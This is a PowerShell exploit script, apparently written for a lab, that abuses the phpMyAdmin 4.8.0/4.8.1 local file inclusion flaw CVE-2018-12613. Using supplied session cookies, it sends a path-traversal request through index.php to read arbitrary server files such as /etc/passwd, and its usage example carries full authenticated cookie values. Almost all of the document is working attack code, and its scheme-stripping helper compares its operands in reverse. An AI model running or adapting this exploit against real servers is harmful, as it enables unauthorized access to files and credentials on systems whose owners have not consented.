<#
.SYNOPSIS
This PowerShell Script leverages a Local file inclusion vulnerability in PHPMyAdmin v4.8.1 and v4.8.0.

.EXAMPLE
Replay the HTTP request using authenticated cookies to retrieve /etc/passwd from remote server.
    
    PS> Invoke-CVE-2018-12613  -File "/etc/passwd" -PHPMyAdminURL "http://b5smgvbpzywcvdlxk3d14io4j.public1.attackdefenselabs.com" -Cookie 'phpMyAdmin=pbtfgslkrdlfan3jm49oj826pktu41v8; pma_lang=en; pmaUser-1=%7B%22iv%22%3A%22YJwwgt2uYR7bCFWvftDJxQ%3D%3D%22%2C%22mac%22%3A%226f1d43e1bd7d14d09531bc6ef7b27e7266b57413%22%2C%22payload%22%3A%22NQLZDeamYe7VPQLbteLm1w%3D%3D%22%7D; pmaAuth-1=%7B%22iv%22%3A%22UjQn%2Bml0aW%2BHDrvH2rfn2Q%3D%3D%22%2C%22mac%22%3A%22f2079d2c65e2dc11fd9f5a55c9694ab8f39c8bf9%22%2C%22payload%22%3A%22kHm7oxSxw2LKSxNFyyg2MRuuB89iqYw0BusJC0F0bIY%3D%22%7D; auto_saved_sql_sort='
#>
function Invoke-CVE-2018-12613
{
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$PHPMyAdminURL,

        [Parameter(Mandatory = $true, Position = 1)]
        [string]$Cookie,

        [Parameter(Mandatory = $true, Position = 2)]
        [string]$File
    )


    # Cookie handling knowledege from here: https://blog.gripdev.xyz/2015/05/27/powershell-invoke-webrequest-with-a-cookie/

    $WebSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession

    # Splits cookie data by delimiter ;  (which is default in browsers)
    foreach($CookieData in $Cookie.Split(";"))
    {
        $TupleData = $CookieData.Split("=")
        if($TupleData.Length -le 1)
        {
            Write-Error "Invalid cookie detected."
            Continue
        }
        $CookieName = $TupleData[0].Replace(" ", "")
        $CookieValue = $TupleData[1]
        $CookieObj = New-Object System.Net.Cookie

        $CookieObj.Name = $CookieName
        $CookieObj.Value = $CookieValue
        $CookieObj.Domain = (Remove-Scheme $PHPMyAdminURL)
        $WebSession.Cookies.Add($CookieObj)
        Write-Output "Cookie $CookieName was added to session."
        
    }
    
    return (Invoke-WebRequest -WebSession $WebSession -Uri ("$PHPMyAdminURL/index.php?target=db_sql.php%253f" + ("/.." * 16) + $File)).Content
}


function Remove-Scheme
{
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$URI
    )
    if("https://" -match $URI)
    {
        return $URI.Replace("https://", "" )
    } else {
        return $URI.Replace("http://", "" )
    }
}